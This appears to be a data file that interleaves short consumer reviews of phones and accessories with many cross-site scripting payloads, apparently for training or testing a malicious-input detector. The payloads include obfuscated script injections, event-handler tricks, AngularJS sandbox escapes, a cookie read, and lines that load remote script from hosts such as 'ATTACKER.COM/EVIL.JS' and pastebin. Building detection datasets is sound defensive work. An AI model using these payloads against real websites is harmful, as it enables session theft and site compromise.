611;<scripT>cryptO.GeneRAtECrmFREqUESt('CN=0';0;0;NuLl;alErT(1)';384;NulL;RSa-Dual-use')</scRipT>;;;;;;;;;;;;;;;;;
612;"<iframe name=""admin"" src=""https://bypasses-everywhere.ctf.insecurity-insa.fr/admin""></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
613;Then a few days later the a puff of smoke came out of the phone while in use.;;;;;;;;;;;;;;;;;;;;;;;;
614;"<iframe xmlns=""#"" src=""javascript:alert(1)""></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
615;"I can barely ever hear on it and am constantly saying ""what?""";;;;;;;;;;;;;;;;;;;;;;;;
616;<img src=`%00`&newline;; onerror=alert(1)&newline;;;;;;;;;;;;;;;;;;;;;;
617;"<IFRAME XMLNS=""#"" SRC=""JAVASCRIPT:ALERT(1)""></IFRAME>";;;;;;;;;;;;;;;;;;;;;;;;
618;This BlueAnt Supertooth hands-free phone speaker is AWESOME.;;;;;;;;;;;;;;;;;;;;;;;;
619;"&LT;IMG SRC=\""JAV&#X09;ASCRIPT&#058;ALERT('XSS');\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
620;&Lt;;stYLE&gT;@IMporT'hTtP&#58;//HA&#46;cKErs&#46;ORG/xsS&#46;csS';&lT;/stYLe&Gt;;;;;;;;;;;;;;;
621;Also difficult to put on.I'd recommend avoiding this product.;;;;;;;;;;;;;;;;;;;;;;;;
622;"&lt;br size=\""&{alert('xss')}\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
623;"<svg xmlns=""#""><script>alert(1)</script></svg>";;;;;;;;;;;;;;;;;;;;;;;;
624;<SCRIPT/&TAB;; SRC='HTTPS://DL.DROPBOX.COM/U/13018058/JS.JS' /&TAB;></SCRIPT>;;;;;;;;;;;;;;;;;;;;;
625;"<% foo><x foo=""%><script>alert(123)</script>"">";;;;;;;;;;;;;;;;;;;;;;;;
626;<IMg sRC=`%00`&NEWlINe;; onerRoR=ALeRT(1)&NEWline;;;;;;;;;;;;;;;;;;;;;;
627;<INPUT ONBLUR=WRITE(XSS) AUTOFOCUS><INPUT AUTOFOCUS>;;;;;;;;;;;;;;;;;;;;;;;;
628;"<A HREF=""DATA:TEXT/HTML;BLABLA,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">CLICK ME</A>";;;;;;;;;;;;;;;;;;;;;;;;
629;Verizon tech support walked my through a few procedures; none of which worked and I ended up having to do a hard re-set; wiping out all my data.;;;;;;;;;;;;;;;;;;;;;;
630;Due to this happening on every call I was forced to stop using this headset.;;;;;;;;;;;;;;;;;;;;;;;;
631;Fits comfortably; came with three sizes of earbud tips.;;;;;;;;;;;;;;;;;;;;;;;
632;"&lt;div style=\""background-image&#58; url(javascript&#058;alert('xss'))\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
633;For the price on Amazon; it is an excellent product; which I would highly recommend.;;;;;;;;;;;;;;;;;;;;;;
634;"<input/onmouseover=""javascript&colon;confirm&lpar;1&rpar;""";;;;;;;;;;;;;;;;;;;;;;;;
635;"<a href=""javascript:void(0)"" onmouseover=&newline;javascript:alert(1)&newline;>x</a><///style///><span %2f onmousemove='alert&lpar;1&rpar;'>span";;;;;;;;;;;;;;;;;;;;;;;;
636;the charger worked for about a week and then completely stopped charging my phone.;;;;;;;;;;;;;;;;;;;;;;;;
637;"&lt;IMG STYLE=\""xss&#58;expr/*XSS*/ession(alert('XSS'))\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
638;foo\�;; alert(document.cookie);//�;;;;;;;;;;;;;;;;;;;;;
639;Finally; after three or four times the spring of the latch broke and I could not use it any longer on the visor.;;;;;;;;;;;;;;;;;;;;;;;
640;<SCRIPT/SRC=HTTPS://WWW.GOOGLE.COM/COMPLETE/SEARCH?CLIENT=CHROME&Q=HELLO&CALLBACK=ALERT></SCRIPT>;;;;;;;;;;;;;;;;;;;;;;;;
641;"&lt;style&gt;@im\port'\ja\vasc\ript&#58;alert(\""xss\"")';&lt;/style&gt;";;;;;;;;;;;;;;;;;;;;;;;;
642;Not only did the software do a great job of this; I could also make my own ringtones form my existing CDs without an internet connection.;;;;;;;;;;;;;;;;;;;;;;;
643;"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""\>";;;;;;;;;;;;;;;;;;;;;;;;
644;"<OBJECT DATA=""HTTP://CORKAMI.GOOGLECODE.COM/SVN/!SVN/BC/480/TRUNK/MISC/PDF/HELLOWORLD_JS_X.PDF"">";;;;;;;;;;;;;;;;;;;;;;;;
645;<A Aa aAa AaaA AaaAA aAAaAA AAAaaaa AaAaAaAA aAaaaAaaa aaaAAAAAAA HREF=J&#97v&#97scrIpT&#x3A;;&#97LerT(1)>cLICkme;;;;;;;;;;;;;;;;;;;;;;
646;&Lt;;boDY OnloAD=ALerT('xsS')&GT;;;;;;;;;;;;;;;;;;;;;;
647;My experience was terrible..... This was my fourth bluetooth headset; and while it was much more comfortable than my last Jabra (which I HATED!!!;;;;;;;;;;;;;;;;;;;;;;;
648;This is infuriating.;;;;;;;;;;;;;;;;;;;;;;;;
649;<sCriPT/&tAB;; SrC='htTpS://dl.dROPBOx.coM/U/13018058/JS.js' /&TAB;></SCRIPt>;;;;;;;;;;;;;;;;;;;;;
650;I checked everywhere and there is no feature for it which is really disappointing.;;;;;;;;;;;;;;;;;;;;;;;;
651;&lt;;BODY ONLOAD=alert('XSS')&gt;;;;;;;;;;;;;;;;;;;;;;
652;"<! foO=""[[[INCePTION]]""><X FOO=""]fOO><SCRIPt>alerT(1)</SCriPT>"">";;;;;;;;;;;;;;;;;;;;;;;;
653;"&LT;liNK ReL=\""sTyLESHEET\"" hrEF=\""javaScrIPT&#058;aLErT('XSs');\""&gT;";;;;;;;;;;;;;;;;;;;;;;;;
654;"""/>'><SCRIPT SRC=HTTPS://ATTACKER.COM/EVIL.JS></SCRIPT>";;;;;;;;;;;;;;;;;;;;;;;;
655;Great product.;;;;;;;;;;;;;;;;;;;;;;;;
656;Cumbersome design.;;;;;;;;;;;;;;;;;;;;;;;;
657;These are fabulous!;;;;;;;;;;;;;;;;;;;;;;;;
658;"doCUMeNT.querYsELeCtOR('Div').INNErHtml=""<Iframe sRC='javasCrIPt:vAR s = dOCuMENT.CreateeleMENt(\""ScRiPt\"");s.SRC = \""HTTPs://pasTebIn.coM/raw/dW5cWGK6\"";DocUMEnT.boDY.aPPEndChiLD(s);'></ifRaME>"";";;;;;;;;;;;;;;;;;;;;;;;;
659;"""><IfrAme oNLOaD=""EvAl('d=dOcUMent; _=d.CREateeleMenT(\'SCrIpT\');_.sRC=\'\/\/DOmaIn/M\';d.BoDY.ApPendCHILD(_)')"">";;;;;;;;;;;;;;;;;;;;;;;;
660;"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
661;"<% foo><x foo=""%><script>alert(123)</script>"">";;;;;;;;;;;;;;;;;;;;;;;;
662;I am very happy;;;;;;;;;;;;;;;;;;;;;;;;
663;+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-;;;;;;;;;;;;;;;;;;;;;;;;
664;"""><a href=""javascript:eval('d=document; _ = d.createelement(\'script\');_.src=\'//domain\';d.body.appendchild(_)')"">click me for an awesome time</a>";;;;;;;;;;;;;;;;;;;;;;;;
665;"<iFRaME src=""jAvasCrIPt:aleRT('xSS');""></IfRAmE>";;;;;;;;;;;;;;;;;;;;;;;;
666;<SVG><SCRIPT %00>ALERT&LPAR;;1&RPAR; {OPERA};;;;;;;;;;;;;;;;;;;;;
667;It doesn't work in Europe or Asia.;;;;;;;;;;;;;;;;;;;;;;;;
668;%22/%3E%3CBODY%20onload=�document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)�%3E;;;;;;;;;;;;;;;;;;;;;;;;
669;Not nearly as good looking as the AMAZON picture makes it look.;;;;;;;;;;;;;;;;;;;;;;;;
670;lightweight and works well.;;;;;;;;;;;;;;;;;;;;;;;;
671;<SCRIPT 5-0*3+9/3=>pRoMPT(1)</scRIpT GivEAnsWERhErE=?;;;;;;;;;;;;;;;;;;;;;;;;
672;"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
673;I own 2 of these cases and would order another.;;;;;;;;;;;;;;;;;;;;;;;;
674;Good case!.;;;;;;;;;;;;;;;;;;;;;;;;
675;Too bad you have to pay up to $$$ a month for the service!;;;;;;;;;;;;;;;;;;;;;;;;
676;This was utterly confusing at first; which caused me to lose a couple of very; very important contacts.;;;;;;;;;;;;;;;;;;;;;;
677;"<DIV STYLE=""width: expression(alert('XSS'));"">";;;;;;;;;;;;;;;;;;;;;;;;
678;"<div draggable=""true"" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable>drop here</xss>";;;;;;;;;;;;;;;;;;;;;;;;
679;It does everything the description said it would.;;;;;;;;;;;;;;;;;;;;;;;;
680;"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>";;;;;;;;;;;;;;;;;;;;;;;;
681;"JAVASCRIPT:/*--></TITLE></STYLE></TEXTAREA></SCRIPT></XMP><SVG/ONLOAD='+/""/+/ONMOUSEOVER=1/+/[*/[]/+DOCUMENT.LOCATION=`//LOCALHOST/MH`//'>";;;;;;;;;;;;;;;;;;;;;;;;
682;<input onblur=write(XSS) autofocus><input autofocus>;;;;;;;;;;;;;;;;;;;;;;;;
683;Treo and T-Mobile refused to replace it again and forced me to buy another phone without any kind of upgrade discount.;;;;;;;;;;;;;;;;;;;;;;;;
684;"""><IFRAME ONLOAD=""EVAL('D=DOCUMENT; _=D.CREATEELEMENT(\'SCRIPT\');_.SRC=\'\/\/DOMAIN/M\';D.BODY.APPENDCHILD(_)')"">";;;;;;;;;;;;;;;;;;;;;;;;
685;Yes it's shiny on front side - and I love it!;;;;;;;;;;;;;;;;;;;;;;;;
686;%2baciapga8-script%2bad4-alert%28document.location%29%2badw-%2fscript%2bad4apaai-;;;;;;;;;;;;;;;;;;;;;;;;
687;If you like a loud buzzing to override all your conversations; then this phone is for you!;;;;;;;;;;;;;;;;;;;;;;;
688;"&lt;div style=\""background-image&#58;\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
689;"<SCRIPT SRC=""HTTPS://CDNJS.CLOUDFLARE.COM/AJAX/LIBS/PROTOTYPE/1.7.2/PROTOTYPE.JS""></SCRIPT><SCRIPT SRC=""HTTPS://CDNJS.CLOUDFLARE.COM/AJAX/LIBS/ANGULAR.JS/1.0.8/ANGULAR.JS"" /></SCRIPT><DIV NG-APP NG-CSP>{{ X = $ON.CURRY.CALL().EVAL(""FETCH('HTTP://LOCALHOST/INDEX.PHP').THEN(D => {})"") }}</DIV>""><SCRIPT SRC=""HTTPS://CDNJS.CLOUDFLARE.COM/ANGULAR.MIN.JS""></SCRIPT> <DIV NG-APP NG-CSP>{{$EVAL.CONSTRUCTOR('ALERT(1)')()}}</DIV>""><SCRIPT SRC=""HTTPS://CDNJS.CLOUDFLARE.COM/ANGULARJS/1.1.3/ANGULAR.MIN.JS""> </SCRIPT><DIV NG-APP NG-CSP ID=P NG-CLICK=$EVENT.VIEW.ALERT(1337)>";;;;;;;;;;;;;;;;;;;;;;;;
690;Disappointing accessory from a good manufacturer.;;;;;;;;;;;;;;;;;;;;;;;;
691;Seller shipped quickly and much cheaper than the competitors.;;;;;;;;;;;;;;;;;;;;;;;;
692;Good ; works fine.;;;;;;;;;;;;;;;;;;;;;;;
693;While I managed to bend the leaf spring back in place; the metal now has enough stress that it will break on the next drop.;;;;;;;;;;;;;;;;;;;;;;;
694;However; BT headsets are currently not good for real time games like first-person shooters since the audio delay messes me up.;;;;;;;;;;;;;;;;;;;;;;;
695;It's very convenient and simple to use - gets job done & makes the car ride so much smoother.;;;;;;;;;;;;;;;;;;;;;;;;
696;Case was more or less an extra that I originally put on but later discarded because it scratched my ear.;;;;;;;;;;;;;;;;;;;;;;;;
697;"<table><td background=""javascript:alert('xss')"">";;;;;;;;;;;;;;;;;;;;;;;;
698;"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">";;;;;;;;;;;;;;;;;;;;;;;;
699;<script ^__^>alert(String.fromCharCode(49))</script ^__^;;;;;;;;;;;;;;;;;;;;;;;;
700;<SVG><STYLE>{FONT-FAMILY&COLON;;<IFRAME/ONLOAD=CONFIRM(1)>';;;;;;;;;;;;;;;;;;;;;;
